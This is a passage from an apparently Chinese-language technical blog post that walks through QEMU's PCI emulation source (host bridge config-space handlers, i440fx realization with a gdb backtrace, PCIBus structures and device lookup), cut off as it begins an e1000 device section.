class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">pci_host_config_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                                     <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIHostState *s = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> val = s-&gt;config_reg;</span><br><span class="line"></span><br><span class="line">    PCI_DPRINTF(<span class="string">&quot;%s addr &quot;</span> HWADDR_FMT_plx <span class="string">&quot; len %d val %&quot;</span>PRIx32<span class="string">&quot;\n&quot;</span>,</span><br><span class="line">                __func__, addr, len, val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_host_data_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                                <span class="type">uint64_t</span> val, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIHostState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;config_reg &amp; (<span class="number">1u</span> &lt;&lt; <span class="number">31</span>))</span><br><span class="line">        pci_data_write(s-&gt;bus, s-&gt;config_reg | (addr &amp; <span class="number">3</span>), val, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">pci_host_data_read</span><span class="params">(<span class="type">void</span> *opaque,</span></span><br><span class="line"><span class="params">                                   hwaddr addr, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIHostState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(s-&gt;config_reg &amp; (<span class="number">1U</span> &lt;&lt; <span class="number">31</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pci_data_read(s-&gt;bus, s-&gt;config_reg | (addr &amp; <span class="number">3</span>), len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_data_write</span><span class="params">(PCIBus *s, <span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDevice *pci_dev = pci_dev_find_by_addr(s, addr);</span><br><span class="line">    <span class="type">uint32_t</span> config_addr = addr &amp; (PCI_CONFIG_SPACE_SIZE - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pci_dev) &#123;</span><br><span class="line">        trace_pci_cfg_write(<span class="string">&quot;empty&quot;</span>, extract32(addr, <span class="number">16</span>, <span class="number">8</span>),</span><br><span class="line">                            extract32(addr, <span class="number">11</span>, <span class="number">5</span>), extract32(addr, <span class="number">8</span>, <span class="number">3</span>),</span><br><span class="line">                            config_addr, val);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pci_host_config_write_common(pci_dev, config_addr, PCI_CONFIG_SPACE_SIZE,</span><br><span class="line">                                 val, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pci_data_read</span><span class="params">(PCIBus *s, <span class="type">uint32_t</span> addr, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDevice *pci_dev = pci_dev_find_by_addr(s, addr);</span><br><span class="line">    <span class="type">uint32_t</span> config_addr = addr &amp; (PCI_CONFIG_SPACE_SIZE - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pci_dev) &#123;</span><br><span class="line">        trace_pci_cfg_read(<span class="string">&quot;empty&quot;</span>, extract32(addr, <span class="number">16</span>, <span class="number">8</span>),</span><br><span class="line">                           extract32(addr, <span class="number">11</span>, <span class="number">5</span>), extract32(addr, <span class="number">8</span>, <span class="number">3</span>),</span><br><span class="line">                           config_addr, ~<span class="number">0x0</span>);</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0x0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pci_host_config_read_common(pci_dev, config_addr,</span><br><span class="line">                                       PCI_CONFIG_SPACE_SIZE, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，这里就是Qemu模拟的前面<a href="#PCI配置空间">PCI配置空间</a>中<strong>CONFIG_ADDRESS</strong>和<strong>CONFIG_DATA</strong>的逻辑。但这里未将<strong>MemoryRegion</strong>绑定到对应的地址空间，那只能是在实例化的时候绑定的</p><h4 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  i440fx_pcihost_realize (dev=0x5555573de800, errp=0x7fffffffd420) at ../../qemu/hw/pci-host/i440fx.c:250</span></span><br><span class="line"><span class="comment">//#1  0x0000555555e9c4f4 in device_set_realized (obj=0x5555573de800, value=true, errp=0x7fffffffd530) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea7cfb in property_set_bool (obj=0x5555573de800, v=0x5555573dfd30, name=0x5555562f9dd1 &quot;realized&quot;, opaque=0x5555570f4510, errp=0x7fffffffd530) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea5891 in object_property_set (obj=0x5555573de800, name=0x5555562f9dd1 &quot;realized&quot;, v=0x5555573dfd30, errp=0x7fffffffd530) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#4  0x0000555555eaa4ca in object_property_set_qobject (obj=0x5555573de800, name=0x5555562f9dd1 &quot;realized&quot;, value=0x5555573dfa50, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#5  0x0000555555ea5c4a in object_property_set_bool (obj=0x5555573de800, name=0x5555562f9dd1 &quot;realized&quot;, value=true, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e9bc0e in qdev_realize (dev=0x5555573de800, bus=0x555557360240, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e9bc47 in qdev_realize_and_unref (dev=0x5555573de800, bus=0x555557360240, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:299</span></span><br><span class="line"><span class="comment">//#8  0x0000555555966b7a in sysbus_realize_and_unref (dev=0x5555573de800, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/hw/core/sysbus.c:261</span></span><br><span class="line"><span class="comment">//#9  0x0000555555cb292b in pc_init1 (machine=0x555557357800, pci_type=0x5555562ab7db &quot;i440FX&quot;) at ../../qemu/hw/i386/pc_piix.c:212</span></span><br><span class="line"><span class="comment">//#10 0x0000555555cb35e3 in pc_init_v9_0 (machine=0x555557357800) at ../../qemu/hw/i386/pc_piix.c:523</span></span><br><span class="line"><span class="comment">//#11 0x000055555595f8be in machine_run_board_init (machine=0x555557357800, mem_path=0x0, errp=0x7fffffffd810) at ../../qemu/hw/core/machine.c:1547</span></span><br><span class="line"><span class="comment">//#12 0x0000555555bdbc78 in qemu_init_board () at ../../qemu/system/vl.c:2613</span></span><br><span class="line"><span class="comment">//#13 0x0000555555bdbf87 in qmp_x_exit_preconfig (errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2705</span></span><br><span class="line"><span class="comment">//#14 0x0000555555bde944 in qemu_init (argc=35, argv=0x7fffffffdb48) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e96f93 in main (argc=35, argv=0x7fffffffdb48) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#16 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=35, argv=argv@entry=0x7fffffffdb48) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=35, argv=0x7fffffffdb48, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdb38) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#18 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">i440fx_pcihost_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ERRP_GUARD();</span><br><span class="line">    I440FXState *s = I440FX_PCI_HOST_BRIDGE(dev);</span><br><span class="line">    PCIHostState *phb = PCI_HOST_BRIDGE(dev);</span><br><span class="line">    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);</span><br><span class="line">    PCIBus *b;</span><br><span class="line">    PCIDevice *d;</span><br><span class="line">    PCII440FXState *f;</span><br><span class="line">    <span class="type">unsigned</span> i;</span><br><span class="line"></span><br><span class="line">    memory_region_add_subregion(s-&gt;io_memory, <span class="number">0xcf8</span>, &amp;phb-&gt;conf_mem);</span><br><span class="line">    sysbus_init_ioports(sbd, <span class="number">0xcf8</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    memory_region_add_subregion(s-&gt;io_memory, <span class="number">0xcfc</span>, &amp;phb-&gt;data_mem);</span><br><span class="line">    sysbus_init_ioports(sbd, <span class="number">0xcfc</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* register i440fx 0xcf8 port as coalesced pio */</span></span><br><span class="line">    memory_region_set_flush_coalesced(&amp;phb-&gt;data_mem);</span><br><span class="line">    memory_region_add_coalescing(&amp;phb-&gt;conf_mem, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    b = pci_root_bus_new(dev, <span class="literal">NULL</span>, s-&gt;pci_address_space,</span><br><span class="line">                         s-&gt;io_memory, <span class="number">0</span>, TYPE_PCI_BUS);</span><br><span class="line">    phb-&gt;bus = b;</span><br><span class="line"></span><br><span class="line">    d = pci_create_simple(b, <span class="number">0</span>, s-&gt;pci_type);</span><br><span class="line">    f = I440FX_PCI_DEVICE(d);</span><br><span class="line"></span><br><span class="line">    range_set_bounds(&amp;s-&gt;pci_hole, s-&gt;below_4g_mem_size,</span><br><span class="line">                     IO_APIC_DEFAULT_ADDRESS - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* setup pci memory mapping */</span></span><br><span class="line">    pc_pci_as_mapping_init(s-&gt;system_memory, s-&gt;pci_address_space);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if *disabled* show SMRAM to all CPUs */</span></span><br><span class="line">    memory_region_init_alias(&amp;f-&gt;smram_region, OBJECT(d), <span class="string">&quot;smram-region&quot;</span>,</span><br><span class="line">                             s-&gt;pci_address_space, SMRAM_C_BASE, SMRAM_C_SIZE);</span><br><span class="line">    memory_region_add_subregion_overlap(s-&gt;system_memory, SMRAM_C_BASE,</span><br><span class="line">                                        &amp;f-&gt;smram_region, <span class="number">1</span>);</span><br><span class="line">    memory_region_set_enabled(&amp;f-&gt;smram_region, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* smram, as seen by SMM CPUs */</span></span><br><span class="line">    memory_region_init(&amp;f-&gt;smram, OBJECT(d), <span class="string">&quot;smram&quot;</span>, <span class="number">4</span> * GiB);</span><br><span class="line">    memory_region_set_enabled(&amp;f-&gt;smram, <span class="literal">true</span>);</span><br><span class="line">    memory_region_init_alias(&amp;f-&gt;low_smram, OBJECT(d), <span class="string">&quot;smram-low&quot;</span>,</span><br><span class="line">                             s-&gt;ram_memory, SMRAM_C_BASE, SMRAM_C_SIZE);</span><br><span class="line">    memory_region_set_enabled(&amp;f-&gt;low_smram, <span class="literal">true</span>);</span><br><span class="line">    memory_region_add_subregion(&amp;f-&gt;smram, SMRAM_C_BASE, &amp;f-&gt;low_smram);</span><br><span class="line">    object_property_add_const_link(qdev_get_machine(), <span class="string">&quot;smram&quot;</span>,</span><br><span class="line">                                   OBJECT(&amp;f-&gt;smram));</span><br><span class="line"></span><br><span class="line">    init_pam(&amp;f-&gt;pam_regions[<span class="number">0</span>], OBJECT(d), s-&gt;ram_memory, s-&gt;system_memory,</span><br><span class="line">             s-&gt;pci_address_space, PAM_BIOS_BASE, PAM_BIOS_SIZE);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(f-&gt;pam_regions) - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        init_pam(&amp;f-&gt;pam_regions[i + <span class="number">1</span>], OBJECT(d), s-&gt;ram_memory,</span><br><span class="line">                 s-&gt;system_memory, s-&gt;pci_address_space,</span><br><span class="line">                 PAM_EXPAN_BASE + i * PAM_EXPAN_SIZE, PAM_EXPAN_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ram_addr_t</span> ram_size = s-&gt;below_4g_mem_size + s-&gt;above_4g_mem_size;</span><br><span class="line">    ram_size = ram_size / <span class="number">8</span> / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">if</span> (ram_size &gt; <span class="number">255</span>) &#123;</span><br><span class="line">        ram_size = <span class="number">255</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    d-&gt;config[I440FX_COREBOOT_RAM_SIZE] = ram_size;</span><br><span class="line"></span><br><span class="line">    i440fx_update_memory_mappings(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，确实如前面<a href="#对象初始化">对象初始化</a>中分析的，是在实例化中绑定的<strong>MemoryRegion</strong></p><h2 id="PCI总线"><a href="#PCI总线" class="headerlink" title="PCI总线"></a>PCI总线</h2><p>根据前面<a href="#PCI设备编号">PCI设备编号</a>可知，由总线编号、设备编号和功能编号可唯一确定一个PCI设备，则PCI总线需要模拟该功能，即通过这些信息能唯一定位一个PCI设备</p><p>Qemu中表示PCI总线的<strong>TypeInfo</strong>变量<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci.c#L219"><strong>struct pci_bus_info</strong></a>如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_bus_info = &#123;</span><br><span class="line">    .name = TYPE_PCI_BUS,</span><br><span class="line">    .parent = TYPE_BUS,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(PCIBus),</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(PCIBusClass),</span><br><span class="line">    .class_init = pci_bus_class_init,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h3><p>Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/pci/pci_bus.h#L13"><strong>struct PCIBusClass</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/pci/pci_bus.h#L33"><strong>struct PCIBus</strong></a>来表征PCI总线</p><h4 id="struct-PCIBusClass"><a href="#struct-PCIBusClass" class="headerlink" title="struct PCIBusClass"></a>struct PCIBusClass</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * PCI Bus datastructures.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Do not access the following members directly;</span></span><br><span class="line"><span class="comment"> * use accessor functions in pci.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIBusClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    BusClass parent_class;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*bus_num)(PCIBus *bus);</span><br><span class="line">    <span class="type">uint16_t</span> (*numa_node)(PCIBus *bus);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其主要包含一些成员变量的访问函数</p><h4 id="struct-PCIBus"><a href="#struct-PCIBus" class="headerlink" title="struct PCIBus"></a>struct PCIBus</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIBus</span> &#123;</span></span><br><span class="line">    BusState qbus;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">PCIBusFlags</span> <span class="title">flags</span>;</span></span><br><span class="line">    <span class="type">const</span> PCIIOMMUOps *iommu_ops;</span><br><span class="line">    <span class="type">void</span> *iommu_opaque;</span><br><span class="line">    <span class="type">uint8_t</span> devfn_min;</span><br><span class="line">    <span class="type">uint32_t</span> slot_reserved_mask;</span><br><span class="line">    pci_set_irq_fn set_irq;</span><br><span class="line">    pci_map_irq_fn map_irq;</span><br><span class="line">    pci_route_irq_fn route_intx_to_irq;</span><br><span class="line">    <span class="type">void</span> *irq_opaque;</span><br><span class="line">    PCIDevice *devices[PCI_SLOT_MAX * PCI_FUNC_MAX];</span><br><span class="line">    PCIDevice *parent_dev;</span><br><span class="line">    MemoryRegion *address_space_mem;</span><br><span class="line">    MemoryRegion *address_space_io;</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, PCIBus) child; <span class="comment">/* this will be replaced by qdev later */</span></span><br><span class="line">    QLIST_ENTRY(PCIBus) sibling;<span class="comment">/* this will be replaced by qdev later */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The bus IRQ state is the logical OR of the connected devices.</span></span><br><span class="line"><span class="comment">       Keep a count of the number of devices with raised IRQs.  */</span></span><br><span class="line">    <span class="type">int</span> nirq;</span><br><span class="line">    <span class="type">int</span> *irq_count;</span><br><span class="line"></span><br><span class="line">    Notifier machine_done;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其除了保存挂载的设备<strong>devices</strong>外，还记录了子总线<strong>child</strong></p><h3 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h3><p>根据<a href="#PCI总线">pci总线</a>中的<strong>pci_bus_info</strong>可知，PCI总线只有<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci.c#L201"><strong>pci_bus_class_init()</strong></a>来进行对象初始化。</p><h4 id="对象初始化-1"><a href="#对象初始化-1" class="headerlink" title="对象初始化"></a>对象初始化</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_bus_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    BusClass *k = BUS_CLASS(klass);</span><br><span class="line">    PCIBusClass *pbc = PCI_BUS_CLASS(klass);</span><br><span class="line">    ResettableClass *rc = RESETTABLE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    k-&gt;print_dev = pcibus_dev_print;</span><br><span class="line">    k-&gt;get_dev_path = pcibus_get_dev_path;</span><br><span class="line">    k-&gt;get_fw_dev_path = pcibus_get_fw_dev_path;</span><br><span class="line">    k-&gt;realize = pci_bus_realize;</span><br><span class="line">    k-&gt;unrealize = pci_bus_unrealize;</span><br><span class="line"></span><br><span class="line">    rc-&gt;phases.hold = pcibus_reset_hold;</span><br><span class="line"></span><br><span class="line">    pbc-&gt;bus_num = pcibus_num;</span><br><span class="line">    pbc-&gt;numa_node = pcibus_numa_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，其主要初始化了相关的函数指针，而这些函数指针会用于定位PCI设备，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * PCI address</span></span><br><span class="line"><span class="comment"> * bit 16 - 24: bus number</span></span><br><span class="line"><span class="comment"> * bit  8 - 15: devfun number</span></span><br><span class="line"><span class="comment"> * bit  0 -  7: offset in configuration space of a given pci device</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* the helper function to get a PCIDevice* for a given pci address */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> PCIDevice *<span class="title function_">pci_dev_find_by_addr</span><span class="params">(PCIBus *bus, <span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> bus_num = addr &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="type">uint8_t</span> devfn = addr &gt;&gt; <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pci_find_device(bus, bus_num, devfn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCIDevice *<span class="title function_">pci_find_device</span><span class="params">(PCIBus *bus, <span class="type">int</span> bus_num, <span class="type">uint8_t</span> devfn)</span></span><br><span class="line">&#123;</span><br><span class="line">    bus = pci_find_bus_nr(bus, bus_num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bus)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bus-&gt;devices[devfn];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCIBus *<span class="title function_">pci_find_bus_nr</span><span class="params">(PCIBus *bus, <span class="type">int</span> bus_num)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIBus *sec;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bus) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pci_bus_num(bus) == bus_num) &#123;</span><br><span class="line">        <span class="keyword">return</span> bus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Consider all bus numbers in range for the host pci bridge. */</span></span><br><span class="line">    <span class="keyword">if</span> (!pci_bus_is_root(bus) &amp;&amp;</span><br><span class="line">        !pci_secondary_bus_in_range(bus-&gt;parent_dev, bus_num)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try child bus */</span></span><br><span class="line">    <span class="keyword">for</span> (; bus; bus = sec) &#123;</span><br><span class="line">        QLIST_FOREACH(sec, &amp;bus-&gt;child, sibling) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pci_bus_num(sec) == bus_num) &#123;</span><br><span class="line">                <span class="keyword">return</span> sec;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* PXB buses assumed to be children of bus 0 */</span></span><br><span class="line">            <span class="keyword">if</span> (pci_bus_is_root(sec)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pci_root_bus_in_range(sec, bus_num)) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (pci_secondary_bus_in_range(sec-&gt;parent_dev, bus_num)) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pci_bus_num</span><span class="params">(PCIBus *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> PCI_BUS_GET_CLASS(s)-&gt;bus_num(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h2><p>这里就以<strong>e1000</strong>为例，通过分析其代码来学习Qemu对于PCI设备的模拟逻辑</p><p>根据<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L1763"><strong>e1000_register_types()</strong></a>的逻辑，其<strong>struct TypeInfo</strong>如下所示<br><figure class="highlight c"><table><tr><td 